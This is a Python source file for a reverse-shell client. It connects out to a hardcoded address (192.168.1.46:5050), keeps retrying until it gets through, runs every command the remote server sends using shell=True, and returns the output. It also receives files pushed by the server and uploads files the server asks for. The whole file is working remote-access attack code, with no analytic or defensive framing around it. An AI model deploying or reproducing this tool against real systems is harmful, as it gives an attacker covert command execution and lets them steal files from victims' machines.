import socket
import os
import subprocess
import tqdm


class DeleteError(Exception):
    pass


class Tools:

    # convert a number to list of bytes
    @staticmethod
    def number_to_bytes(num):
        buf = []
        while num:
            buf.append(num & 0xff)
            num >>= 8
        return buf

    # ... | data[2]<<16 | data[1]<<8 | data[0]
    @staticmethod
    def bytes_to_number(*data, param=0, num=0):
        if len(data):
            return Tools.bytes_to_number(*data[1:], param=param | (data[0] << (8*num)), num=num + 1)
        else:
            return param

    @staticmethod
    def LstStr2I(arg):  # list of str to integer convertion
        i = 0
        j = len(arg)
        while (i < j):
            arg[i] = int(arg[i])
            i += 1
        return arg

    @staticmethod
    def number_ext(arg):  # return number of digits
        i = 0
        while (arg > 0):
            arg = int(arg / 10)
            i += 1
        return i



class Client:

    def __init__(self, _host, _port, _public_mode=True, always_try_to_connect=True):
        try:
            assert type(_host) == int or type(_port) == int
            self.target = (_host, _port)
            self.client = socket.socket()
            self.mode = {'p': _public_mode, 'c': always_try_to_connect}
            if _public_mode:
                print('#Initialization complete!')
        except:
            if _public_mode:
                print('#Initialization error!')

    def start(self):
        try:
            self.client.connect(self.target)
            if self.mode['p']:
                print(f'#client successfully connected to {self.target[0]}:{self.target[1]}')
            self.connection_handler()
        except socket.error as msg:
            if self.mode['p']:
                print(f'#connection error! {msg}')

            if self.mode['c']:
                self.start()

    def connection_handler(self):
        # sending data protocol: first we try to send length of data then sending actual data

        # Event submission protocol: first we try to send the activator flag,
        # in the second step we send the data length then we send the real data
        try:
            while 1:
                #self.client.send('the name of allah'.encode())
                #print('yesyes cient')
                inp = self.client.recv(1024).decode('utf8')
                #print(inp)
                if not inp.find('cd'):
                    # address extraction
                    inp = inp.strip('cd').strip()
                    try:
                        os.chdir(inp)
                    except:
                        pass
                    self.data_send('oK'.encode())

                if 'self.' in inp:
                    buffer_size = 4096
                    inp = inp.replace('self.', '', 1)
                    data_tmp = list(map(str.strip, inp.split(' ')))
                    #_____________________________________________________________________
                    # sending self.download [file_size] [file_name/source_path] to client
                    if data_tmp[0] == 'download':
                        data_tmp = 0
                        try:
                            inp = list(map(str.strip, inp.replace('download', '', 1).split('"')))
                            inp = list(filter(lambda x: x and not x == ' ', inp))
                            data_size = int(inp[0])
                            inp = inp[1]
                            if not os.path.exists(inp):
                                f = open(inp, 'wb')
                                self.data_send('ready'.encode())
                            else:
                                self.data_send('err'.encode())
                                raise DeleteError('#ERROR! The file not found.')

                            if self.mode['p']:
                                print(f'#Ready to download file "{inp}"/file size = {data_size}')

                            while not data_tmp >= data_size:
                                data_tmp += f.write(self.client.recv(4096))
                            if self.mode['p']:
                                print('# file downloaded successfully!')
                            f.close()
                        except DeleteError as msg:
                            if self.mode['p']:
                                print(msg)
                    # _____________________________________________________________________
                    # sending self.upload  [file_name/source_path] to client
                    elif data_tmp[0] == 'upload':
                        try:
                            inp = list(map(str.strip, inp.replace('upload', '', 1).split('"')))
                            inp = list(filter(lambda x: x and not x == ' ', inp))[0]

                            f = open(inp, 'rb')
                            file_size = os.path.getsize(inp)
                            if self.mode['p']:
                                print(f'#Ready to upload file "{inp}"/file size = {file_size}')
                            self.data_send('ready'.encode())

                            self.data_send(str(file_size).encode())

                            while 1:
                                inp = f.read(1048576)
                                if not inp:
                                    if self.mode['p']:
                                        print('#file transmitting is done!')
                                    break
                                self.data_send(inp)
                            f.close()
                        except FileNotFoundError as msg:
                            self.data_send('err')
                            if self.mode['p']:
                                print('#Error: File not found')

                elif len(inp) > 0:
                    cmd = subprocess.Popen(inp, shell=True, stdout=subprocess.PIPE,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    res = cmd.stdout.read() + cmd.stderr.read()
                    self.data_send(res)

                res = os.getcwd().encode() + ' >'.encode()
                self.data_send(res)

        except socket.error as msg:
            if self.mode['p']:
                print('#An error occurred while receiving data from the target! ', msg)
            if self.mode['c']:
                #close current cunnection
                self.__init__(*self.target, *self.mode.values())
                self.start()

    def data_send(self, binary_array):
        self.client.sendall(bytes(Tools.number_to_bytes(len(binary_array))))
        # wait for an acknowledgement
        self.client.recv(1)
        # send data
        self.client.sendall(binary_array)
        # wait for an acknowledgement
        self.client.recv(1)


if __name__ == "__main__":
    #host = socket.gethostbyname(socket.gethostname())
    host ='192.168.1.46'
    port = 5050
    client = Client(host, port)
    client.start()